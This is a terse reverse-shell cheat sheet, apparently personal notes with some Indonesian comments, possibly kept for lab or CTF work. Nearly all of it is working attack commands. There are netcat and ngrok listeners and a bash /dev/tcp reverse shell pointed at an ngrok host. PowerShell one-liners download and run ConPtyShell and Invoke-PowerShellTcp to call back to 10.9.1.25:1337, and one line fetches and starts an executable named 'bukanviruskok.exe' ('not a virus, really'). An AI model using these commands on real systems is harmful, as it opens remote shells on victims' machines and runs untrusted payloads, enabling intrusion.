##Open Netcat Server

- nc -lv localhost 8782
- ncat -lvnp 1234

##target windows :
- stty raw -echo; (stty size; cat) | ncat -lvnp 1337

##Spawn Ngrok Server
- ngrok tcp 8782

##Payload Client :
- https://www.revshells.com
- https://bit.ly/3yNL1hg
- sh -i >& /dev/tcp/6.tcp.ngrok.io/15060 0>&1


##Spawn TTY
- python -c 'import pty; pty.spawn("/bin/sh")'
- python -c 'import pty; pty.spawn("/bin/bash")'

##Spawn python server :
python3 -m http.server 9000

#powershell
- powershell IEX(IWR https://raw.githubusercontent.com/antonioCoco/ConPtyShell/master/Invoke-ConPtyShell.ps1 -UseBasicParsing); Invoke-ConPtyShell 10.9.1.25 1337

#buat yg ga ada iwr/old version windows :

- powershell iex (New-Object Net.WebClient).DownloadString('http://10.9.1.25:9000/payload/revshellwindow.ps1');Invoke-ConPtyShell 10.9.1.25 1337

- powershell iex (New-Object Net.WebClient).DownloadString('http://10.9.1.25:9000/payload/revshellwindowold.ps1'); Invoke-PowerShellTcp -Reverse -IPAddress 10.9.1.25 -Port 1337

- powershell "(New-Object System.Net.WebClient).Downloadfile('http://10.9.1.25:9000/payload/bukanviruskok.exe','bukanviruskok.exe')"

- Start-Process "bukanviruskok.exe"
powershell "(New-Object System.Net.WebClient).Downloadfile('http://10.9.1.25:9000/tes.bat','tes.bat')"